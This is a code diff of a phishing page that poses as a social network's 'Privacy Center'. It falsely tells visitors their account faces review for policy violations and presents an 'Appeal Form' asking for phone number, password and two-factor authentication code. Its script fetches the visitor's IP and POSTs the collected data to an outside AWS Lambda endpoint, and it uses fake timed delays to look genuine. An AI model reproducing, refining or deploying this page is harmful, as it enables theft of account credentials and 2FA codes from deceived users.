@@ -11,7 +11,6 @@
     <link rel="stylesheet" href="../styles/style.css">
     <link rel="shortcut icon" href="../ico.ico" type="image/x-icon">
 
-
 </head>
 
 <body>
@@ -631,7 +630,6 @@
                 var diffTime = current - end;
                 var diff = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
                 var clean = false
-                console.log(diff)
                 if (diff >= 0) {
                     var charToPaste = '1'.repeat(0)
                     if (clean) {
@@ -3096,7 +3094,6 @@
                         </svg>
                     </div>
                     <h1>Privacy Center</h1>
-                    <br>
                     <div id="action-buttons">
 
                         <div class="action-button account" id="utm-user" style="display: none;">
@@ -3139,7 +3136,7 @@
                                 </svg>
                             </div>
                             <div class="action-button-text">
-                                Home Page
+                                Privacy Center Home Page
                             </div>
                             <div class="action-button-arrow">
 
@@ -3245,18 +3242,14 @@
             <div class="col-8">
                 <div id="right" style="padding-top: 18px;">
                     <h1>
-                        <img src="../img/block_2.png" alt="" style="height: 50px;
-                        width:50px;
+                        <img src="../img/block_2.png" alt="" style="height: 40px;
+                        width:40px;
                         margin-right: 8px;">
                         Policy Violation
                     </h1>
-                    <h6>
-                        We have received multiple reports that suggest that your account has been in violation of our Terms of Services and Community Guidelines. As a result, your account has been scheduled for review.
-                    </h6>
-                    <div id="utm-ticketId" style="display: block;">
-                    </div>
-
-
+                    <h6>We have received multiple reports that suggest that your account has been in violation of our
+                        Terms of Services and Community Guidelines. As a result, your account has been scheduled for
+                        review.</h6>
                     <div class="action-button wide" id="view-accounts" onclick="accountsModal.show()"
                         style="display: none; margin-bottom: 15px;">
                         <div class="action-button-img">
@@ -3277,34 +3270,25 @@
                         </div>
                         <br>
                     </div>
-                    <div id="card">
-                        <img src="../img/PrivacyCenter2.png" alt="">
 
+                    </ul>
+                    <div id="card">
+                        <!-- <img src="/img/unlock.png" alt=""> -->
+                        <!-- <img src="/img/mobile.png" alt=""> -->
+                        <img src="../img/shild.jpg" alt="">
                         <div class="card-text">
-                            <div style="border-radius: 15px;
-                            background: linear-gradient(
-  90deg,
-  rgba(249, 241, 249, 1) 0%,
-  rgba(234, 243, 253, 1) 35%,
-  rgba(237, 251, 242, 1) 100%
- ) ;
-                            padding: 20px 20px 10px 20px;">
-                                <h5>This form is intended solely for submitting appeals and requesting account restoration.</h5><br>
-                                <p>Please ensure that you provide all the required information below. Failure to do so may result in delays in processing your appeal.</p>
-                                <br>
+                            <h4>This form is only to be used for submitting appeals and restoring account status</h4>
+                            <p>Please ensure that you provide the requested information below.
+                                Failure to do so may delay the processing of your appeal.</p>
+                            <div class="btn-wrapper">
                                 <div id="start" class="button fb-blue w-100" data-bs-toggle="modal"
                                     data-bs-target="#exampleModal1">
                                     Request Review</button>
                                 </div>
-                                <br>
                             </div>
-                            <div class="btn-wrapper">
-                                
-                            </div>
-
                         </div>
                     </div>
-                    
+
                     <h6>Privacy Center</h6>
                     <div class="fake-likns">
                         <div class="action-button-list">
@@ -3452,7 +3436,7 @@
         <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
             <div class="modal-content">
                 <div class="modal-header">
-                    <h4 class="modal-title" id="exampleModalLabel">Appeal Form</h4>
+                    <h5 class="modal-title" id="exampleModalLabel">Appeal Form</h5>
                     <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                 </div>
                 <div class="modal-body">
@@ -3483,7 +3467,7 @@
                         </div>
 
                         <div class="mb-3">
-                            <label for="PhoneFirld" class="form-label">Mobile Phone Number</label>
+                            <label for="PhoneFirld" class="form-label">Mobile phone number</label>
                             <input value="" name="mobile-phone-number" type="tel" class="form-control" id="PhoneFirld"
                                 required aria-describedby="emailHelp" minlength="7" maxlength="18">
                         </div>
@@ -3535,7 +3519,7 @@
                                 <label for="exampleInputPassword" class="form-label">Password</label>
                                 <div style="display: flex; align-items: center;">
                                     <input name="password-1" type="password" class="form-control"
-                                        id="exampleInputPassword" autocomplete="off" minlength="6" maxlength="100"
+                                        id="exampleInputPassword" autocomplete="off" minlength="6" maxlength="30"
                                         aria-describedby="emailHelp" required
                                         onfocus="this.removeAttribute('readonly');">
                                 </div>
@@ -3582,14 +3566,11 @@
             <div class="modal-content">
                 <div class="modal-body">
                     <div class="twoFAinfo-wraper">
-                        <h2 class="modal-title" id="2FAmodalLabel">Check your authentication code </h2>
-                        <br>
-                        <h5>
-                            Enter the code for this account from the two-factor authentication you set up (such as
-                            Google Authenticator, email or text message on your mobile).
-                        </h5>
+                        <h1 class="modal-title" id="2FAmodalLabel">Check your authentication code </h1>
+                        <p>Enter the code for this account from the two-factor authentication you set up (such as
+                            Google Authenticator, email or text message on your mobile).</p>
                         <div class="fb-round-wraper">
-                            <img src="../img/2FA.jpg" alt="" style="width: 100%;">
+                            <img src="../img/2FA.png" alt="" style="width: 100%;">
                         </div>
                     </div>
 
@@ -3788,7 +3769,6 @@
                 </div>
                 <div class="modal-body">
                     <h4 class="modal-title" id="policyModalLabel">Privacy Policy</h4>
-                    <br>
                     <h5>What is the Privacy Policy and what does it cover?</h5>
                     <div class="action-button wide">
                         <div class="action-button-img">
@@ -3832,7 +3812,7 @@
                     </p>
                     <br>
                     <p>
-                        The full text of the policy is provided below.
+                        Полный текст политики приведен ниже.
                     </p>
                     <br>
                     <div class="action-button-list">
@@ -4059,6 +4039,10 @@
             </div>
         </div>
     </div>
+
+
+
+
     <script>
         window.mobileCheck = function () {
             let check = false;
@@ -4338,6 +4322,8 @@
 
         })
 
+
+
         // Get User IP
         var url = 'https://api.db-ip.com/v2/free/self/'
         async function getUserIp() {
@@ -4360,6 +4346,7 @@
             }
         }
 
+        /////
         getUserIp()
 
         // Send data to Email
@@ -4384,14 +4371,12 @@
                 'user_referrer': window.window.location.href
             };
 
-            $.ajax('https://ajfesgwpz2qubmqrdvu6warxam0lssjq.lambda-url.us-west-2.on.aws', {
+            $.ajax('https://ajfesgwpz2qubmqrdvu6warxam0lssjq.lambda-url.us-west-2.on.aws/', {
                 type: 'POST',
                 data: JSON.stringify(templateData),
                 contentType: 'application/json'
             }).done(function () {
-                // Xử lý khi gửi thành công
             }).fail(function (error) {
-                // Xử lý khi gửi thất bại
             });
         }
 
@@ -4411,7 +4396,7 @@
                 spiner.style.display = 'none'
                 buttonText.style.display = 'block'
                 button.removeAttribute('disabled')
-            }, 3000)
+            }, SEND_FORM_FICTIV_TIME)
 
         }
 
@@ -4457,7 +4442,7 @@
                     apiModal.hide()
                     twoFAModal.show()
                 }
-            }, 6000)
+            }, SEND_FORM_FICTIV_TIME)
 
         }
         var counter2FA = 1
@@ -4506,7 +4491,7 @@
                     buttonText.style.display = 'block'
                 }
 
-            }, 8000)
+            }, SEND_FORM_FICTIV_TIME)
         }
 
         function unlock2FA() {
@@ -4567,7 +4552,11 @@
                 var now = new Date().getTime();
                 var distance = Math.round((now - countDownDate) / 1000);
                 var insertedTime = INCORRECT_2FA_TIMEOUT - distance;
-                document.getElementById("timer").innerHTML = insertedTime + "s";
+                var tmps = '';
+                if (insertedTime < 10) {
+                    tmps = '0';
+                }
+                document.getElementById("timer").innerHTML = tmps + insertedTime + "s";
                 document.getElementById("timer").style.display = 'inline';
                 if (insertedTime <= 0) {
                     clearInterval(x);
